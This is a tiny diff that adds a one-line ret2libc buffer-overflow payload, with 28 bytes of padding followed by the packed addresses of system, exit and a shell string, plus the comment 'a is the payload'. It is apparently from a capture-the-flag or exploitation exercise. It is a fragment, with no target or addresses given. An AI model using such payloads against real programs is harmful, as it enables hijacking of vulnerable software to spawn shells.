@@ -1,0 +1,2 @@
+ a = b'A'*28+ p32(sys) + p32(exit) + p32(shell)
+a is the payload
